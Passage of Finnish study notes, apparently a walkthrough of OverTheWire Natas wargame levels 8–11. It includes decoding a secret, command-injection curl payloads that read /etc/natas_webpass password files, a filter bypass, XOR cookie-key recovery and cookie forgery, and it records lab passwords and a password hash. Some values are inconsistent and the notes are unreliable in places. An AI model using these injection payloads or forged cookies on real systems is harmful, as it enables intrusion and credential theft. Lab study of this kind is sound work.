T√§m√§ on yksi tapa k√§ytt√§en Kali Linux PHP, jossa toistettaan se salattu koodi ja purettaan
- ensin purettaan hex to bin (hex koodattu takaisin bin√§√§riksi)
- toisena joka **k√§√§nt√§√§ annetun merkkijonon ja palauttaa sen** v√§h√§ kuin peilaus / takaperin
- viimeisen√§ base64 dekoodaus

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ php -a
Interactive shell

php > echo hex2bin("3d3d516343746d4d6d6c315669563362");
==QcCtmMml1ViV3b
php > echo strrev("==QcCtmMml1ViV3b");
b3ViV1lmMmtCcQ==
php > echo base64_decode ("b3ViV1lmMmtCcQ==");
oubWYf2kBq
```

Toinen tapa, ja perus kantsii hy√∂dynt√§√§ teko√§ly apua ja nettien apua. T√§m√§ alempi jossa tapahtuu `xxd` , `rev` ja `base64`-komentoa vastaavaa prosessia.

- xxd - tarkoittaa hex ja bin√§√§rimuunnin (muuntaa tiedoston hexadesmiaalisen muotoon eli sen bin√§√§ridatana)
- rev - tarkoittaa k√§√§nt√∂ (reverse) eli k√§√§nt√§√§ annetun tekstin toisinp√§in/peilikuvana esim. "Hello" --> "olleH"

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
oubWYf2kBq                                                                                                              
```


T√§m√§ kokonaisuus tarkoittaa tyyppillisen menetelm√§n esim. piilotetun tiedon paljastamiseksi (CTF(Capture The Flag)-hakkerointihaasteissa tai tietoturvatutkimuksessa).


## Level 8 - KALI LINUX STEPPI - START HERE;

T√§st√§ on hyv√§ my√∂s varmistaakin, vaikka t√§m√§ onkin salausmenetelm√§, mutta kokeillaan my√∂s HTTP POST/PUT/DELETE eli niiden headeri requestit, ett√§ toistettaan t√§m√§ salausmenetelm√§n koodinsa sinne formaatti kentt√§√§ns√§.

T√§m√§ on aikaisempi Level 6 , sy√∂tett√§√§n salattu salasansa sinne formaattiin ett√§ menee sinne URL:iin kentt√§√§ns√§ `‚îî‚îÄ$ curl -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/`


natas8 xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

T√§m√§ on se toimiva versio;
`curl -X POST -d "secret=oubWYf2kBq&submit=submit" -H "Referer: http://natas8.natas.labs.overthewire.org/" -u "natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q" http://natas8.natas.labs.overthewire.org/`

tuolla forms elemetiss√§ rivill√§ 16-19 Just t√§t√§ pit√§√§ ottaa huomioon, koska just siin√§ `<input> type = submit name=submit>` - on se mik√§ vaikuttaa curl komentoon, ja t√§t√§ pit√§√§ j√§ljitt√§√§ siihen. Kent√§n `name=XXXX` on se ik√§√§n kuin m√§√§ritett√§v√§ avain `key` , HTTP POST-datassa ja sen kirjainkoko t√§ytyy t√§smenty√§ curl-komennon mukaan.



| HTML-lomake                                  | Oikea `curl` POST-data                        |
|----------------------------------------------|-----------------------------------------------|
| `<input type="submit" name="submit">`        | `-d "secret=oubWYf2kBq&submit=submit"`        |
| `<input type="submit" name="Submit">`        | `-d "secret=oubWYf2kBq&Submit=submit"`        |
| `<input type="submit" name="GoButton">`      | `-d "secret=oubWYf2kBq&GoButton=submit"`      |

üìù **Huom:** HTML-kenttien `name`-arvot ovat kirjainkoosta riippuvaisia (**case-sensitive**).  
`curl`-komennon t√§ytyy k√§ytt√§√§ t√§sm√§lleen samaa nime√§ kuin lomakkeen kent√§ss√§, tai palvelin ei tunnista pyynt√∂√§ oikein.


# LEVEL 9 - START HERE;

natas9  ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

T√§ss√§ kappaleessa tapahtuu SQL injektiota, ja t√§ss√§ tasossa k√§ytett√§√§n puolikasta kaksoispistett√§ `;`. Miten t√§m√§ liittyy t√§h√§n haavoittuvuutteen ja tasoon? Koska SQL-injektiossa liittyy siihen, miten SQL-kyselyt voidaan ketjuttaa tai erottaa toisistaan. SQL-injektiossa hy√∂kk√§√§j√§ voi k√§ytt√§√§ puolikasta kaksoispistett√§ ; lis√§t√§kseen ylim√§√§r√§isi√§ SQL-komentoja alkuper√§iseen kyselyyn, mik√§ voi johtaa tietokannan manipulointiin tai tietojen vuotamiseen.

Puolipiste ; toimii "porttina", jolla komentovirta katkaistaan ja uusi komento laitetaan tilalle. V√§h√§ kuin alkava ja p√§√§ttyv√§, ett√§ v√§liss√§ on jokin prosessi.

harjoituksessa t√§ss√§ tapahtui periaatteessa riviss√§ / kohdalla kuin `"passthru("grep -i $key dictionary.txt");"` - joka on haavoittuvuus. T√§m√§ ei tarkista, mit√§ `$key` muuttujassa on - joten k√§ytt√§j√§ voi lis√§t√§ shell-komentoja sen per√§√§n puolipisteell√§ `;`



T√§ss√§ harjoituksessa nimenomaan passthru()-funktio on haavoittuva, koska:
- Se suorittaa shell-komennon suoraan ilman suodatusta.
- K√§ytt√§j√§n sy√∂te ($_REQUEST["needle"]) liitet√§√§n suoraan komentoon ilman rajausta tai puskurointia.
- Ja kuten mainitsit ‚Äì puolipiste ; toimii komentojen erottimena Linuxin bashissa, jolloin hy√∂kk√§√§j√§ voi lis√§t√§ omia komentojaan per√§√§n.

Todellisuuden parantaminen, jos puhutaan tietoturvallisesta ja vastuullisesta tavasta k√§sitell√§ k√§ytt√§j√§n sy√∂tett√§, niin `passthru()`-funktion k√§ytt√∂ pit√§isi useimmissa tapauksissa poistaa tai ainakin erist√§√§ tarkasti.
    - √§l√§ koskaan p√§√§st√§ k√§ytt√§ji√§ sy√∂tett√§ komentoriville - edes k√§sitelyns√§ - jos voi tehd√§ niin saman asian suoraan PHP:ll√§.
    - Vain rajoittaa k√§ytt√§j√§n sy√∂tett√§ siten, ett√§ sit√§ ei k√§sitell√§ tai hyv√§ksy√§, ellei se viittaa tiettyyn hyv√§ksyttyyn tiedostoon/hakemistoon tai arvoon. T√§m√§ on yksi suojaustapa.

T√§m√§ koskee my√∂s muita erikoismerkkej√§, polkuviittauksia kuten `../secrets.txt` ja sallii vain esim. `dictionary.txt`- tiedoston k√§sittely√§, ja ei k√§yt√§ komentorivienk√§skyj√§ **(passthru/exe2c)**- kaikkiin tehd√§ turvallisesti PHP:ll√§ ja t√§m√§ koskee koko verkkosivustojen arkkitehtuuria.

N√§iden URL v√§lilehdest√§ n√§kee, mit√§ toistin aikaisemmin ja kent√§ss√§ on vain pient√§ toistoa, ett√§ mit√§ sy√∂tin.


## Level 9 - Kali Linux step - START HERE

Jos t√§m√§ level muisttuu kuin 7, mutta sitten sinne sy√∂tt√∂ kent√§√§n kun k√§ytt√§j√§ n√§ppytt√§√§ jotakin niin pit√§√§ tuoda se virallinen vastaus siihen, ja v√§h√§ kuin formaatti mit√§ aikaisempi leveliss√§kin on varmasti kokeilut (level 6).

T√§m√§ oli aikaisempi pohja;
level 6, POST; `curl -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/`


`curl -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/`


natas9  ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

T√§m√§ on se html formaatti lomake kentt√§ koodi;
```
            <form>
                Find words containing: <input name=needle>
                <input type=submit name=submit value=Search>
                <br>
                <br>
            </form>
```

eli nyt pit√§√§ ottaa varmasti huomioon `needle` ja t√§ss√§ on mukana `value=Search` l√§hetyspainiketta, kun sit√§ painettaan (HTML) lomakkeesta niin se k√§y l√§hett√§√§ palvelimelle ja k√§y l√§vitse asiansa. Jos t√§ss√§ pit√§√§ ottaa huomiona toi **type=submit name=submit** toi submit on pienell√§ ja **input name=needle** eli "needle" eli sama idea kuin aikaisempi mutta v√§h√§ eri koska **value=Search** on mukana.

T√ÑM√Ñ ON VAIN MALLI;
curl -X POST -d "secret=;ls -l;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/


TESTATA POHJA 1(T√§ss√§ xyz yritt√§√§ hakea jotain sanakirjasta, mutta se ei ole tarpeellista, koska sinua kiinnostaa vain komentoinjektio);
`curl -X POST -d "needle=xyz; ls -l;%26submit=submit"-H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/`

TESTATAVA POHJA2 - TOIMII
`curl -X POST -d "needle=; ls -l;submit=submit"-H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/`

POHJA3 - TOIMI
`curl -X POST -d "needle=;ls -l;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/`


**Miksi t√§ss√§ ei mainittu lis√§ vihjeit√§?**

T√§m√§ on tahallista. T√§st√§ tasosta eteenp√§in *OverTheWire* alkaa siirty√§ v√§hemm√§n k√§dest√§ pit√§viin teht√§viin ja alkaa testata. T√§ss√§ level 9:ss√§ vaikka l√§hdekoodissa ei suoraan mainita salasanaa tai sen sijaintia, sen odotetaan l√∂ytyv√§n tiedostosta muodossa, mutta jatkossa voi olla jouduttaan k√§ytt√§√§ t√§t√§ tallennettua tiedoston polkua `/etc/natas_webpass/natas10`.

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ curl -X POST -d "needle=;ls /etc/natas_webpass;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/ 

```

## Level 9 - Miniyhteenveto
t√§ss√§ kokonaisuudessaan ei tapahtunut SQL injketiota, vaan enemmin komentorivin (shell) - Linux injektiota (command injection / linux shell injection). Koska erona SQL injektiossa k√§ytett√§isiin heitomerkki√§ `'` ja esim. `' OR '1'='1` ja jne, mutta t√§ss√§ terminaalissa k√§ytettiin alku ja p√§√§ttyv√§ puolikas kaksoispiste.

**Miksi n√§in, ja miksi t√§m√§ komentoinjektiota?** 
Koska yhdess√§ sivustossa tuli PHP koodirivss√§ kuin `passthru("grep -i $needle dictionary.txt");` ja siksi k√§ytt√§j√§n sy√∂te p√§√§tyy osaksi shell-komentoa ilman suojausta ja se ei liittyisik√§√§n tietokantaan eik√§ SQL lauseisiin ja siksi kyseess√§ on puhdas **command injection**. 

Sek√§ t√§ss√§ tapahtui  shell-komentoa (`grep`) ja `passthru()`-funktiota ‚Äî mit√§√§n tietokantaa ei ole mukana.




# LEVEL 10 - START HERE;

lis√§√§ lunttilappua;
- F12 / inspect - tarkista koodi
- lis√§√§ polkun per√§√§n `/robots.txt`
- jos on kuva tiedosto niin tarkista onko hakemiston polkua olemassa esim. `/files/image1.jpg`

curl komento lunttilappu;
- $curl -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org"


headerin tarkistusta ja -h (-Header) lyhenne;
- $curl -H "Referer: http://natas7.natas.labs.overthewire.org/" -u "natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" "http://natas7.natas.labs.overthewire.org/index.php?page=home" 


T√§m√§ on jos on formaatti lomake kentt√§ ja tarkista avainsana nimetty html sivustossa; 
- curl -X POST -d "secret=FOEIUWGHFEEUHOFUOIU&submit=Submit" -H "Referer: http://natas6.natas.labs.overthewire.org/" -u "natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned" http://natas6.natas.labs.overthewire.org/



natas10 t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

/etc/natas_webpass/natasX - (level 7 & 9)


periaatteessa t√§m√§ on se linux shell komentojen injektio est√§minen eli ei voida k√§ytt√§√§ en√§√§n `;` puoli kaksoispistett√§ ja siksi siin√§ lukee `if(preg_match..blahlbah)` tietty√§ erikoismerkkej√§ estetty ja on mahdollista muita erikoismerkki√§ saattavat toimia.
```
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

Vain rajoitettu/tietty erikoismerkki toimii esim. t√§hti `*` --> `*ls -l*` ja voi olla jotakin erikoismerkki√§ jos ovat kaksi yhdess√§ esim. piste ja t√§hti `.*` ja muita voi testata, mutta oman testauksena t√§ss√§ harjoituksen leveliss√§ menin jopa `.* $`

Testattuna ainakin; `.* cat /etc/natas_webpass/natas11 .* ` - ja v√§lily√∂nnitkin pit√§√§ olla mukana, jotta se formaatti ymm√§rt√§√§, ja samankaltainen toimivakin `.* cat /etc/natas_webpass/natas11 $`

Output:
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
.htaccess:AuthType Basic
.htaccess: AuthName "Authentication required"
.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
.htaccess: require valid-user
.htpasswd:natas10:$apr1$0qnBKw4J$7pTRQpYB2Y3JnI01eCSnK1
dictionary.txt:
dictionary.txt:African
dictionary.txt:Africans


## Level 10 - Kali Linux version 


Periaatteessa jos ment√§isiin linux kautta niin menisi sama ideana kuin aikaisempi level 7 ja 9 mukaan, ett√§ joutu sy√∂tt√§√§ ja testailla useampi kerta sit√§ shell injektiota. Komennossa jouduttaisiin k√§ytt√§√§ sit√§ formaatti lomaketta, ja muuttaa sit√§ komennon k√§sky√§ v√§h√§sen.

T√§m√§ on se komento, mutta mik√§ sen formaattin avainsana onkaan, niin sit√§ pit√§√§ tarkistaa ja sama p√§tee erikoismerkien est√§miset.
`curl -X POST -d "needle=;ls -l;&submit=submit" -H "Referer: http://natas9.natas.labs.overthewire.org/" -u "natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t" http://natas9.natas.labs.overthewire.org/`


---

# Level 11 - START HERE

natas11 - UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk


toi background color "#ffffff" on jo oletuksena valmiina kirjautuneena t√§h√§n level 11 sivustoon ja etusivun oletuksen tekstin mukaan lukee n√§in ja vihjeen√§ *"Cookies are protected with XOR encryption"* 

kokeilin toista v√§ri√§, et esim. joku risuaitta (#) jotakin, niin se kyll√§ toimii ja vain vaihtaa background color - ei mit√§√§n erikoista

tarkistellaan viewsourcea seuraavaksi;
ainakin ekana silm√§yksell√§ n√§kyvin PHP koodia on tullut enemm√§n ja paljon funktiota ja if-else toimintoja. Ainakin muutamia toimintoja  kuten; ettei n√§ytet√§ salasanaa jos sy√∂tt√§√§isi `showpassword` , XOR-salaus (salaa tai purkaa tietoa XOR-opereaatiolla), tarkistaa k√§ytt√§jn ev√§steen dataa jotain sis√§lt√∂√§ jsa saveData() - joka tallentaa kaikki tiedot uudelleen ev√§steeseen.


ehk√§ t√§ss√§ on jotakin vihjett√§ ja suoraan annettukin, joka liittyy ev√§steeseen ja XOR-salausta. T√§ss√§ idean on miten XOR-salausta voidaan murtaa jos tunetaan sek√§ salattu viesti√§ aj alkuper√§isen viesti√§ (known plaintext attack)


## Level 11 - selvitt√§mist√§ ja steppi√§

Periaatteessa tuossa v√§lilehden "view sourceode" - siell√§ PHP kieless√§ on annettu vihjeen√§ ja selvitt√§mist√§ ja lukemista t√§ss√§ vaattiikin.


T√§ss√§ riviss√§ on m√§√§ritetty oletus v√§ri on valkoinen `#fffff`

`$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");`


T√§ss√§ PHP-koodi riviss√§ kokoajan puhutaan sanalla `$data` , joka merkitsee jotakin ja viittaakin jotakin, ett√§ ohjaa sit√§ sanaa `bgcolor`.

```
<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
```


Seuraavissa yhdess√§ riveiss√§kin on nimety√§ funktiota, ett√§ tallentaa datansa ja jotakin asettaa ev√§stett√§ ja muuttoksensa koskien salausmenetelm√§√§ **base64_encode(xor_encrypt(json_encode))**

```
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```



T√§ss√§ funktiossa jotenkin se on muutettu tai tallennettu ev√§steeseen, ett√§ jos avainsana `data` t√§smentyy muutettuksi salausmentelm√§√§n eli muutettu salaiseksi koodiksi niin n√§ytt√§√§ sen virallisen salasanansa

```
function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}
```

## XOR cipher - lyhyesti
XOR cipher on yksinkertainen salaustekniikka, joka perustuu bitin vertailuun ja manipulointiin. Se toimii k√§ytt√§m√§ll√§ XOR-operaatiota (engl. exclusive OR) salaamiseen ja purkamiseen.


**Miten se toimii?**
Jokainen bitti (0 tai 1) salattavassa tiedossa yhdistet√§√§n avaimen bittiin k√§ytt√§m√§ll√§ XOR-operaatiota.

XOR-operaatio palauttaa 1, jos kaksi bitti√§ ovat erilaisia, ja 0, jos ne ovat samoja.

Salaaminen ja purkaminen ovat symmetrisi√§: kun salattu tieto XORataan samalla avaimella, alkuper√§inen tieto palautuu.

Esim. A kirjain (ASCII: 01000001 - eli bittein√§) ja k√§ytett√§√§n XOR salauksen avainta (00101100) 

```
01000001  (A)
XOR 00101100  (avain)
------------
01101101  (salattu data)
```

Vaikka XOR cipher on helppo ja nopea, se ei ole kovin turvallinen yksin√§√§n, koska yksinkertainen avaimen toistaminen tekee sen haavoittuvaksi hy√∂kk√§yksille. Sit√§ k√§ytet√§√§n usein osana monimutkaisempia kryptografisia j√§rjestelmi√§.

XOR cipher perustuu siihen, ett√§ valitset avaimen, joka voi olla mik√§ tahansa bittijono. T√§m√§ avain ei ole kiinte√§, eli se voi vaihtua joka kerta, kun haluat salata uuden sanan tai lauseen.


## Level 11 - 2 salausmentelm√§n prosessi

Takaisin salausmentelm√§n prosessiin, ja perus etsii lis√§tietoa netist√§ kuinka t√§m√§ taso-harjoitus on ratkaistettukaan ja tapoja on monta.

Kokeillaan yksi tavasta ainakin joko rakentaa uuden html sivuston ja siit√§ liitt√§√§ sen PHP-koodi p√§tk√§ns√§, ett√§ se tulostuksensa kertoo mik√§ se salainen koodi onkaan. 

PHP-koodissa on m√§√§ritetty n√§in; `$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");` - niin t√§t√§ yritt√§√§n ratkaista.

Periaatteessa oletuksena se on antanutkin vihjeen√§, ett√§ ekana kirjauttuessa sivustoon "background color: #fffff" - normaalisti sy√∂tin satunnaisen v√§rikoodin niin se ainakin tallensin ev√§steeksi (cookies). Seuraavan kerran kun menen t√§h√§n samaan level 11 sivustoon niin se on se sama satunnainen v√§ri mink√§ annoin esim. vaaleasininen.

**cookies ev√§ste**
T√§ss√§ osa-aleuissaan tapahtuu; ev√§ste, XOR-salaus ja tarkkan JSON-muoto. 
Chrome ev√§steen tarkistus steppi; F12 >> application (sovellus) >> "Storage" >> "coookies". 

T√§m√§n valkoinen `#fffff` sen cookies value tallennettu data joka on URL-enkoodattu(encoded) arvo `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D` - koska merkki `=` joka on korvattu muodolla `%3D`.

Kun laitettaan **show URL decoded** niin lukee n√§in; `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=` - koska t√§m√§ on purettu (decoed) arvo. Pieni huomiona ev√§steiden luku saattaa muuttua mm. palvelimen/sivuston/j√§rjestelm√§n p√§ivityksen takia, ett√§ ei mene ihan kuin nettien l√∂yt√§mien ohjeiden mukaan.

**Miksi n√§in tehd√§√§n?**
Joissakin tapauksissa ev√§steen sis√§lt√∂ voi sis√§lt√§√§ erikoismerkkej√§ (esim. =, ;, &), jotka voisivat aiheuttaa ongelmia HTTP-otsikoissa, joten ne enkoodataan turvalliseen URL-muotoon. Selain ja palvelin osaavat dekoodata ne takaisin oikeaan muotoon.

Seuraavaksi huomattaan PHP-funktiossa luke n√§in `showpassword=no` - mutta me haluttaan muuttaa se `showpassword=yes`. Nyt jouduttaan k√§ytt√§√§ XOR decrypti√§, mutta ongelmana meill√§ ei ole avainta, ja joten jouduttaan siksi k√§ytt√§√§ t√§t√§ funktionkutusa `setcookie("data", base64_encode(xor_encrypt(json_encode($d))));`


Perus kysyy teko√§lylt√§ apua ja n√§in, sek√§ t√§ss√§ on yksi PHP-skripti/koodikieli niin t√§t√§ toistettu Kali Linux:sen alla. 
```
php -r 'function xor_encrypt($input) {
  $key = "#fffff";
  $output = "";
  for ($i = 0; $i < strlen($input); $i++) {
    $output .= $input[$i] ^ $key[$i % strlen($key)];
  }
  return $output;
}
$d = ["testi" => "arvo"];
echo base64_encode(xor_encrypt(json_encode($d))) . "\n";'
```

Ekana tarkistettaan onko PHP koodi ladattu t√§ss√§ Kali Linux ohjelman alla, ja yleens√§ oletuksena pit√§isi olla mukana.
```
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ php -v      
PHP 8.2.18 (cli) (built: Apr 11 2024 20:30:26) (NTS)
Copyright (c) The PHP Group
Zend Engine v4.2.18, Copyright (c) Zend Technologies
    with Zend OPcache v8.2.18, Copyright (c), by Zend Technologies


‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ php -r 'function xor_encrypt($input) {
  $key = "#fffff";
  $output = "";
  for ($i = 0; $i < strlen($input); $i++) {
    $output .= $input[$i] ^ $key[$i % strlen($key)];
  }
  return $output;
}
$d = ["testi" => "arvo"];
echo base64_encode(json_encode($d)) "\n";
'

WEQSAxUSSkRcRAcUVQlEGw==


‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop]
‚îî‚îÄ$ php -r '$d = ["key" => "#fffff"]; echo base64_encode(json_encode($d)) . "\n";
'
eyJrZXkiOiIjZmZmZmYifQ==
                                                                                                                             
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop]
‚îî‚îÄ$ php -r '$d = array("showpassword"=>"no", "bgcolor"=>"#ffffff"); echo base64_encode(json_encode($d)) . "\n";'
eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=


```

Toinen vaihtoehto,
Rakensin johonkin W3school johonkin toimivaan php-koodi softan pohjaan, ett√§ runnaa t√§m√§n funktionlauseensa, ett√§ pelitt√§√§k√∂ ja jos runnaa tavallisen html pohjaan niin ei v√§lt√§m√§tt√§ ehk√§ toimi, sek√§ saattiin tuloksena `eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0` ja t√§m√§ on se cookie value. Huomiona t√§ss√§ se **array** sulkeen sis√§ll√§ mit√§ onkaan se varsinainen data, jonka sis√§tl√∂ (avaimen arvo ja niiden j√§rjestys) vaikuttaa tuloksensa, ett√§ millainen se base64-tulos onkaan. Siksi ylemmiss√§ muutama kali linux terminaalissa toistin ja kannattaa kysy√§ teko√§lylt√§ pient√§ apua ja ett√§ miksi.
```
<!DOCTYPE html>
<html>
<body>

<?php

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

echo base64_encode(json_encode($defaultdata)); 

?>


</body>
</html>
```


kolmas vaihtoehto (t√§m√§n skippaan, mutta ... v√§liin tulee se pitk√§ php koodi p√§tk√§ ja m√§√§ritys)
curl --cookie "data=$(php -r '...')" https://example.com

**Jatkuu**
Seuraavaksi k√§ytett√§√§n base64 (aikaisempi saattua avainta) ja suoritettaan XOR:ista avainta ulos kohti. 
Kertauksena t√§m√§ on se Base64 (#fffff); HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=
T√§m√§ k√§ytett√§√§n XOR:iin (array funktio); eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0

Eli base64 (koodi) + k√§ytett√§√§n XOR (eyJz...) Base64 muodossa = eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe
T√§ss√§ toistettuna antoi XOR avaimen ja toistona on "DWoe"

Jos teht√§isiin k√§√§nteis tarkastuksena, ett√§ meneek√∂ l√§pi ja oikein.. ja huomiona XOR kent√§ss√§ pit√§√§ k√§ytt√§√§ UTF8, jotta muutettaisin k√§√§nteisen√§

Eli base64 (koodi) + XOR (eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe) UTF muotodssa = `{"showpassword":"no","bgcolor":"#ffffff"}`


**seuraavaksi**
Luodaan seuraavaksi uusi ev√§ste, ett√§ halutaan t√§m√§ JSON objektiksi  `{"showpassword":"yes","bgcolor":"#ffffff"}`

Sy√∂tett√§√§n XOR kent√§√§n (input) ja k√§ytett√§√§n samaa XOR avainta, ja n√§in antaa output toisenlaisen koodin ja mukaan Base64

XOR (eDWoe....) UTF8 muodossa + To Base64 = output XXXXXX

input: 
{"showpassword":"yes","bgcolor":"#ffffff"}

Output; 
HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUdj
t√§m√§ on se antama ja tuloksen cookie value, sitten tullaan muuttaa se ev√§ste value koodinsa , mutta miten?

eli sijoittaa jotenkin j√§nn√§sti F12(inspect) kautta korvaamalla aikaisemman cookies ev√§steen ID:ns√§.

HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUdj

TWYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUdk

HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D


OPTION 3/
`$ curl -u natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK -b data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK http://natas11.natas.labs.overthewire.org`


---------------------------------------------------

## Level 11 - 2 Uusiks koko steppi??

natas11 - UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

step 1 - ota talteen ev√§ste
natas 11 cookies value: HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
encode:                 HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg=

pit√§isi menn√§ viimeiseen asti , %3D on se reprsenet sign = 


step2 - toinen vihje, setcookie("data", base64_encode(xor_encrypt(json_encode($d))));

cyberchef. to get cipher text

<?php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

echo base64_encode(json_encode($defaultdata));
?>

eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0=


{"showpassword":"no","bgcolor":"#ffffff"}


eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe


**Periaatteessa** muutettaisiin nopeiten t√§m√§ funktio osuus pala "yes" , ja ettei tarvitse menn√§ mutkan kautta.
{"showpassword":"yes","bgcolor":"#ffffff"}

HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUdA


New cookie:-HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUdA



`curl -u natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk -b "data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUcY" http://natas11.natas.labs.overthewire.org`

curl -u "natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk" -b "data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUcY" http://natas11.natas.labs.overthewire.org/

HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc=

Uusi ev√§ste: data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUcY


** Process exited - Return Code: 0 **
Press Enter to exit terminal


document.cookie = "data=HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUcY"
location.reload();


----------------------------------------



```
<?php

function xor_encrypt($in) {
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

//original cookie value 
